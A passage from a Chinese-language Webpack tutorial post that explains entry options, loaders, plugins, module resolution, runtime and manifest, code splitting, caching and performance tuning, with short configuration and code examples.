当前入口所依赖的入口。它们必须在该入口被加载前被加载。</span><br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 指定要输出的文件名称</span><br>      <span class="hljs-attr">import</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 启动时需加载的模块</span><br>      <span class="hljs-attr">library</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 指定 library 选项，为当前 entry 构建一个 library</span><br>      <span class="hljs-attr">runtime</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 运行时 chunk 的名字。如果设置了，就会创建一个新的运行时 chunk。在 webpack 5.43.0 之后可将其设为 false 以避免一个新的运行时 chunk</span><br>      <span class="hljs-attr">publicPath</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 当该入口的输出文件在浏览器中被引用时，为它们指定一个公共 URL 地址</span><br>    &#125;,<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>runtime 和 dependOn 不应在同一个入口上同时使用</li><li>确保 runtime 不能指向已存在的入口名称</li><li>dependOn 不能是循环引用的</li></ul><h3 id="经验之谈"><a href="#经验之谈" class="headerlink" title="经验之谈"></a>经验之谈</h3><ul><li>在webpack4.x及以上版本，不要为 vendor 或其他不是执行起点创建 entry，而是使用 optimization.splitChunks 选项，将 vendor 和 app(应用程序) 模块分开，并为其创建一个单独的文件</li><li>每个 HTML 文档只使用一个入口起点</li></ul><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>loader用于转换某些类型的模块，webpack 只能理解 JavaScript 和 JSON 文件，这是 webpack 开箱可用的自带能力。loader 让 webpack 能够去处理其他类型的文件，并将它们转换为有效模块，以供应用程序使用，以及被添加到依赖图中。</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><ul><li>配置方式：在 webpack.config.js 文件中指定 loader</li><li>内联方式：在每个 import 语句中显式指定 loader，通过为内联 import 语句添加前缀，可以覆盖配置文件中的所有 loader, preLoader 和 postLoader</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 传递参数（类似 webpack 配置中的 options）</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;style-loader!css-loader?modules=true!./styles.css&#x27;</span><br><br><span class="hljs-comment">// 多个参数用 &amp; 分隔</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;url-loader?limit=1024&amp;name=images/[hash].[ext]!./image.png&#x27;</span><br><br><span class="hljs-comment">// 使用 ! 前缀，将禁用所有已配置的 normal loader(普通 loader)</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;!style-loader!css-loader?modules!./styles.css&#x27;</span><br><br><span class="hljs-comment">// 使用 !! 前缀，将禁用所有已配置的 loader（preLoader, loader, postLoader）</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;!!style-loader!css-loader?modules!./styles.css&#x27;</span><br><br><span class="hljs-comment">// 使用 -! 前缀，将禁用所有已配置的 preLoader 和 loader，但是不禁用 postLoaders</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Styles</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;-!style-loader!css-loader?modules!./styles.css&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>loader本质上是<strong>导出为函数的JavaScript模块</strong>，webpack内部的loader runner会调用该函数，并将上一个loader的输出结果作为参数传给该函数</li><li>loader的执行顺序是从右到左，从下到上，可以通过enforce配置项或loader的pitch方法改变执行顺序，<strong>最后一个loader的输出结果应该为String或Buffer类型</strong></li><li>loader可以是同步的，也可以是异步的</li><li>loader运行在Node.js中</li><li>loader内部的this上可访问的属性和方法都通过loader context上下文绑定</li></ul><h3 id="编写一个loader"><a href="#编写一个loader" class="headerlink" title="编写一个loader"></a>编写一个loader</h3><p><strong>my-loader.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 同步loader</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, map, meta</span>) &#123;<br>  <span class="hljs-comment">// 单个处理结果可以直接return</span><br>  <span class="hljs-comment">// return doSomething(source)</span><br>  <span class="hljs-comment">// 多个处理结果则必须调用this.callback()</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-title function_">doSomething</span>(source), map, meta)<br>  <span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 异步loader，必须调用this.async()来告知loader runner等待异步输出结果</span><br><span class="hljs-comment">// 它会返回 this.callback() 回调函数。随后 loader 必须返回 undefined 并且调用该回调函数</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">source, map, meta</span>) &#123;<br>  <span class="hljs-keyword">var</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">async</span>()<br>  <span class="hljs-title function_">doSomeAsyncthing</span>(source, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(err)<br>    &#125;<br>    <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, res, map, meta)<br>  &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>webpack插件是一个具有 <strong>apply</strong> 方法的 JavaScript 类。apply 方法会被 webpack compiler 调用，并且在 <strong>整个</strong> 编译生命周期都可以访问 compiler 对象，插件目的在于解决 loader 无法实现的其他事，包括：打包优化，资源管理，注入环境变量。</p><h3 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h3><ul><li>配置方式：在webpack.config.js文件中，向 plugins 属性传入一个 new 实例</li><li>Node API方式：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> webpack = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;webpack&#x27;</span>) <span class="hljs-comment">// 访问 webpack 运行时(runtime)</span><br><span class="hljs-keyword">const</span> configuration = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.config.js&#x27;</span>)<br><br><span class="hljs-keyword">let</span> compiler = <span class="hljs-title function_">webpack</span>(configuration)<br><br><span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">ProgressPlugin</span>().<span class="hljs-title function_">apply</span>(compiler)<br><br>compiler.<span class="hljs-title function_">run</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, stats</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="编写一个plugin"><a href="#编写一个plugin" class="headerlink" title="编写一个plugin"></a>编写一个plugin</h3><p>一个生成构建文件清单的插件：</p><p><strong>fileListPlugin.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileListPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;<br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;, options)<br>  &#125;<br>  <br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; filename, title &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span><br>    <br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;FileListPlugin&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">compilation, callback</span>) &#123;<br>      <span class="hljs-comment">// 创建文件内容</span><br>      <span class="hljs-keyword">let</span> fileList = title<br>      <br>      <span class="hljs-comment">// 遍历所有编译资源</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> asset <span class="hljs-keyword">in</span> compilation.<span class="hljs-property">assets</span>) &#123;<br>        <span class="hljs-keyword">const</span> size = compilation.<span class="hljs-property">assets</span>[asset].<span class="hljs-title function_">size</span>()<br>        fileList += <span class="hljs-string">`- <span class="hljs-subst">$&#123;asset&#125;</span> (<span class="hljs-subst">$&#123;size&#125;</span> bytes)\n`</span><br>      &#125;<br>      <br>      <span class="hljs-comment">// 将清单作为新资源添加到编译中</span><br>      compilation.<span class="hljs-property">assets</span>[filename] = &#123;<br>        <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> fileList,<br>        <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> fileList.<span class="hljs-property">length</span><br>      &#125;<br>      <br>      <span class="hljs-title function_">callback</span>()<br>    &#125;)<br>  &#125;<br>&#125;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title class_">FileListPlugin</span><br></code></pre></td></tr></table></figure><h2 id="模块解析"><a href="#模块解析" class="headerlink" title="模块解析"></a>模块解析</h2><p>webpack 使用 enhanced-resolve 来解析文件路径，支持三种文件路径的解析：</p><ul><li>相对路径：<code>import &#39;../src/file1&#39;</code></li><li>绝对路径：<code>import &#39;/home/me/file&#39;</code></li><li>模块路径：<code>import &#39;module/lib/file&#39;</code></li></ul><h3 id="解析规则"><a href="#解析规则" class="headerlink" title="解析规则"></a>解析规则</h3><p>当文件路径类型为模块路径时，路径解析遵循以下规则：</p><ul><li>基于webpack.config.js中配置的resolve.modules中指定的目录（默认是<code>[&#39;node_modules&#39;]</code>）进行检索，如果添加一个目录到模块搜索目录，此目录优先于 node_modules&#x2F; 搜索</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">modules</span>: [path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src&#x27;</span>), <span class="hljs-string">&#x27;node_modules&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 将优先从src目录下开始检索</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Tabs</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;antd&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>如果模块（package）中有package.json文件，则在resolve.exportsFields配置项中指定的字段会被依次查找，优先级高于package.json中的main&#x2F;module字段</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">exportsFields</span>: [<span class="hljs-string">&#x27;exports&#x27;</span>, <span class="hljs-string">&#x27;myCompanyExports&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>myPkg中的package.json</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;myPkg&#x27;</span>,<br>  <span class="hljs-attr">scripts</span>: &#123;&#125;,<br>  <span class="hljs-attr">exports</span>: &#123;<br>    <span class="hljs-string">&#x27;.&#x27;</span>: &#123;<br>      <span class="hljs-string">&quot;require&quot;</span>: <span class="hljs-string">&quot;./index.cjs&quot;</span>,<br>      <span class="hljs-string">&quot;import&quot;</span>: <span class="hljs-string">&quot;./index.mjs&quot;</span>,<br>    &#125;,<br>  &#125;,<br>  <span class="hljs-attr">myCompanyExports</span>: &#123;<br>    <span class="hljs-string">&#x27;.&#x27;</span>: &#123;<br>      <span class="hljs-string">&quot;require&quot;</span>: <span class="hljs-string">&quot;./index.cjs&quot;</span>,<br>      <span class="hljs-string">&quot;import&quot;</span>: <span class="hljs-string">&quot;./index.mjs&quot;</span>,<br>    &#125;,<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ES模块导入</span><br><span class="hljs-keyword">import</span> myPkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;myPkg&#x27;</span><br><span class="hljs-comment">// CommonJS模块导入</span><br><span class="hljs-keyword">const</span> myPkg = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;myPkg&#x27;</span>)<br></code></pre></td></tr></table></figure><p>一旦根据上述规则解析路径后，enhanced-resolve 将会检查路径是指向文件还是文件夹。</p><p>如果路径指向文件：</p><ul><li>如果文件具有扩展名，则直接将文件打包</li><li>否则，将使用 resolve.extensions 选项作为文件扩展名来解析，此选项会告诉解析器在解析中能够接受那些扩展名（例如 .js，.jsx）</li></ul><p>如果路径指向一个文件夹，则进行如下步骤寻找具有正确扩展名的文件：</p><ul><li>如果文件夹中包含 package.json 文件，则会根据 resolve.mainFields 配置中的字段顺序查找，并根据 package.json 中的符合配置要求的第一个字段来确定文件路径。</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">mainFields</span>: [<span class="hljs-string">&#x27;browser&#x27;</span>, <span class="hljs-string">&#x27;module&#x27;</span>, <span class="hljs-string">&#x27;main&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>myPkg中的package.json</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;myPkg&#x27;</span>,<br>  <span class="hljs-string">&quot;browser&quot;</span>: <span class="hljs-string">&quot;build/myPkg.js&quot;</span>,<br>  <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;index&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 从build/myPkg.js中查找</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> myPkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;myPkg&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>如果不存在 package.json 文件或 resolve.mainFields 没有返回有效路径，则会根据 resolve.mainFiles 配置选项中指定的文件名顺序查找，看是否能在 import&#x2F;require 的目录下匹配到一个存在的文件名</li><li>然后使用 resolve.extensions 选项，以类似的方式解析文件扩展名</li></ul><h2 id="runtime和mainfest"><a href="#runtime和mainfest" class="headerlink" title="runtime和mainfest"></a>runtime和mainfest</h2><p>在使用 webpack 构建的典型应用程序或站点中，有三种主要的代码类型：</p><ul><li>你或你的团队编写的源码。</li><li>你的源码会依赖的任何第三方的 library 或 “vendor” 代码。</li><li>webpack 的 runtime 和 manifest，管理所有模块的交互。</li></ul><h3 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h3><p>主要指在浏览器运行过程中，webpack用来连接各个模块化代码的代码，runtime代码使模块化代码能加载和解析其他的模块化代码，从而与其他模块化代码交互。可以使用 <code>optimization.runtimeChunk: &#39;single&#39;</code> 选项将 runtime 代码拆分为一个单独的 chunk。</p><h3 id="mainfest"><a href="#mainfest" class="headerlink" title="mainfest"></a>mainfest</h3><p>mainfest是一张映射表，记录了模块打包后的关键元数据，用来在运行时管理模块的加载和依赖关系。理解 Manifest 是掌握 Webpack 运行机制的关键，尤其在 <strong>代码分割</strong> 和 <strong>缓存策略</strong> 优化中至关重要！</p><p>mainfest的主要作用有以下三点：</p><ul><li>模块标识：将打包前的模块路径映射为打包后的模块ID</li><li>动态加载：管理异步加载的模块（如import()拆分的代码块）</li><li>缓存优化：通过内容哈希实现持久缓存</li></ul><p>典型的mainfest内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;./src/index.js&quot;</span>: <span class="hljs-number">0</span>,          <span class="hljs-comment">// 模块路径 → 模块ID</span><br>    <span class="hljs-string">&quot;./src/utils.js&quot;</span>: <span class="hljs-number">1</span><br>  &#125;,<br>  <span class="hljs-string">&quot;chunks&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;main&quot;</span>: &#123;                     <span class="hljs-comment">// 入口代码块</span><br>      <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-string">&quot;main.abc123.js&quot;</span>,     <span class="hljs-comment">// 生成的文件名</span><br>      <span class="hljs-string">&quot;contains&quot;</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]          <span class="hljs-comment">// 包含的模块ID</span><br>    &#125;,<br>    <span class="hljs-string">&quot;async-chunk&quot;</span>: &#123;              <span class="hljs-comment">// 异步代码块</span><br>      <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-string">&quot;async.def456.js&quot;</span>,<br>      <span class="hljs-string">&quot;loaded&quot;</span>: <span class="hljs-literal">false</span>             <span class="hljs-comment">// 标记是否已加载</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&quot;runtime&quot;</span>: <span class="hljs-string">&quot;runtime.xyz789.js&quot;</span>  <span class="hljs-comment">// Webpack 运行时代码</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代码分离"><a href="#代码分离" class="headerlink" title="代码分离"></a>代码分离</h2><p>代码分离是webpack比较重要的特性，它能够将代码分离到不同的bundle，然后按需加载或并行加载，控制资源加载的优先级，提升页面加载速度，常见的代码分离方式有三种：</p><ul><li>入口分离：通过entry配置将三方库（如react、antd等）配置成单独的entry，实现vendor分离</li><li>防止重复：使用入口依赖（entry dependOn）或splitChunksPlugin去重和分离chunk</li><li>动态导入：将顶部的<code>import _ from lodash</code>改为在实际需要lodash的地方引入<code>import(lodash).then((&#123; default: _ &#125;) =&gt; &#123;&#125;)</code></li></ul><p>Webpack v4.6.0+ 增加了对预获取和预加载的支持:</p><ul><li>预获取：<code>import(/* webpackPrefetch: true */ &#39;./path/to/LoginModal.js&#39;)</code></li><li>预加载：<code>import(/* webpackPreload: true */ &#39;ChartingLibrary&#39;)</code></li></ul><p>可以使用webpack官方分析工具或者其他三方工具（webpack-bundle-analyzer、webpack-visualizer等）分析分离后的bundle，进一步优化代码</p><h2 id="缓存-性能优化"><a href="#缓存-性能优化" class="headerlink" title="缓存&#x2F;性能优化"></a>缓存&#x2F;性能优化</h2><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><ul><li>基于浏览器缓存规则，对output.filename使用contenthash可使文件名根据文件内容变化而变化</li><li>使用 <code>optimization.runtimeChunk: &#39;single&#39;</code> 选项将 runtime 代码拆分为一个单独的 chunk</li><li>使用 <strong>splitChunksPlugin</strong>插件的cacheGroup选项来缓存很少修改的三方库</li><li>通过模块标识符（<code>optimization.moduleIds: &#39;deterministic&#39;</code>）保证多次构建后三方vendor的文件名hash值不变</li></ul><h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><ul><li>使用最新版本的webpack、node、npm</li><li>精准使用loader，通过include&#x2F;exclude排查不需要转换的资源</li><li>尽可能少使用loader&#x2F;plugin，它们会额外的消耗性能</li><li>精确的匹配文件资源，减少资源解析的时间，减少resolve.modules, resolve.extensions, resolve.mainFiles, resolve.descriptionFiles 中条目数量，因为他们会增加文件系统调用的次数：<code>import &#39;./src/demo&#39;</code>改为<code>import &#39;./src/demo.js&#39;</code>，resolve.extensions: [‘.js’, ‘.jsx’]</li><li>使用Dllplugin为更改不频繁的代码单独编译</li><li>使用更少&#x2F;更小的三方库，删除未使用的代码，更合理的分离chunk，减少大体积资源的生成</li><li>使用thread-loader将耗资源的loader交给worker池</li><li>使用webpack的cache并配合package.json中的postinstall清除缓存目录实现持久化缓存</li><li>移除webpack ProgressPlugin，该插件没多大实际用途，且耗费资源</li><li>分环境使用loader&#x2F;plugin，不要紧生产环境、开发环境的loader、plugin混用</li><li>使用webpack压缩工具压缩生产环境代码</li><li>source-map非常消耗资源，生产环境应禁用</li><li>合理的使用webpack三方工具（babel、typescript、sass等）</li><li>webpack5.x支持模块联邦，可以在微前端架构中提取公共模块</li><li>合理使用tree shaking：通过webpack的optimization.usedExports: true配合package.json的sideEffects: false将文本标记为无副作用。tree shaking只适用于ES2015以上的import&#x2F;export语法</li><li>真正意义上的懒加载：比如button click事件触发时再动态import lodash</li></ul><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p>webpack运行环境和webpack构建出来的项目的运行环境不是一个概念，webpack基于Node.js运行，webpack构建出来的项目一般基于浏览器环境运行</p><h3 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h3><p>webpack支持所有符合ES5标准的浏览器（不支持IE8及以下版本），如果想兼容旧版本浏览器，需要加载polyfill：</p><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;babel-polyfill&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"></span>) &#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="配置兼容性"><a href="#配置兼容性" class="headerlink" title="配置兼容性"></a>配置兼容性</h3><p>webpack.config.js配置文件是webpack运行过程中本身需要的文件，应避免ES6语法编写代码：</p><ul><li>webpack基于Node.js运行，遵循CommonJS规范</li><li>Node.js v12.x及以上版本才开始支持原生ES6模块（.mjs）,v14.x及以上版本才稳定支持ES6</li><li>webpack原生支持ES6模块是指支持项目代码中的import&#x2F;export语句，但仅限于模块化依赖分析，不包含语法转换。Webpack 会将 import&#x2F;export 转换为自己的模块系统（如__webpack_require__），实现代码拆分和依赖管理。</li></ul><h2 id="零碎知识"><a href="#零碎知识" class="headerlink" title="零碎知识"></a>零碎知识</h2><ul><li>webpack通过mode配置项设置模式，mode取值范围：string &#x3D; ‘production’: ‘none’ | ‘development’ | ‘production’</li><li>webpack通过target配置项设置构建目标，默认值为 “browserslist”，target: string | [string] | false，多target通过多个独立的配置来实现：module.exports &#x3D; [serverConfig, clientConfig]</li><li>开发环境通过source-map跟踪堆栈信息（<code>devtool: &#39;inline-source-map&#39;</code>），生产环境不建议使用source-map</li><li>webpack 提供了几种可选方式帮助在代码发生变化后自动编译代码：–watch、webpack-dev-server、webpack-dev-middleware，watch模式需要手动刷新浏览器，middleware是server的内部实现核心，middleware+express -&gt; server</li><li>publicPath 配置选项在各种场景中都非常有用。可以通过它来指定应用程序中所有资源的基础路径</li><li>webpack5.x版本新增了资源模块，可以不再需要像之前的版本配置各种loader来转换静态资源（图片、字体等）</li><li>命令行接口参数的优先级高于配置文件中的参数，例如：<code>build: webpack --mode=&quot;production&quot;</code>会优于webpack.config.js中的<code>mode: development</code></li><li>可以结合mainfest和stats data分析数据，优化构建性能，mainfest存在于运行时（浏览器环境），stats data存在于构建后（本地json，不影响运行时）</li></ul>]]></content>
    
    
    <categories>
      
      <category>Webpack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Webpack</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
